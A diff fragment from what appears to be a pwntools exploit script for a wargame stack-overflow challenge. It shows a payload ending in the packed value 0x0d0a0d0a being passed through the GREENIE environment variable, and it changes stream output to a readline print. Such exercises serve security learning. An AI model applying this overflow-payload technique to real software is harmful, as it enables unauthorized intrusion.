@@ -15,5 +15,5 @@ payload += p32(0x0d0a0d0a)
 
 p = e.process(env={"GREENIE": payload})
 
-p.stream()
+print(p.readlineS())
 
